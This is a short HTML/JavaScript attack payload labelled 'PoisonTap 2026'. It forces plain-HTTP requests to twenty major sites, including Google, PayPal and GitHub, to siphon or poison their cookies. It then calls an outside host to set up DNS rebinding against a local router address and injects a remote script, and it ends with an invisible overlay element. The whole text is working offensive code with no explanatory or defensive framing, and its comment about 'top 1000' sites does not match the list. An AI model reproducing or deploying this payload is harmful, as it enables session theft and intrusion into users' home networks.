<!-- PoisonTap 2026 | HTML/JS-Agnostic Carrier -->
<script>
(function(){
  if(window.__PT_LOADED) return;
  window.__PT_LOADED = true;
  var D = ['facebook.com','google.com','twitter.com','instagram.com','amazon.com','netflix.com','github.com','microsoft.com','apple.com','yahoo.com','linkedin.com','reddit.com','tiktok.com','twitch.tv','spotify.com','pinterest.com','dropbox.com','wordpress.com','ebay.com','paypal.com'];
  var idx = 0, total = D.length;
  var interval = setInterval(function(){
    if(idx >= total){ clearInterval(interval); return; }
    var host = D[idx++];
    var img = new Image();
    img.onload = img.onerror = function(){
      try{ img.src = null; } catch(e){}
    };
    img.src = 'http://'+host+'/PoisonTap';
  }, 40); // 40ms between requests = ~40s for top 1000

  // DNS Rebinding Setup
  var rbHost = '192.168.0.1';
  fetch('http://1.0.0.1:1337/rebind?ip='+rbHost).then(function(){
    var s = document.createElement('script');
    s.src = 'http://'+rbHost+'.ip.samy.pl/PoisonTap';
    document.body.appendChild(s);
  });
})();
</script>
<div id="pt" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;background:#000;pointer-events:none;opacity:0;"></div>
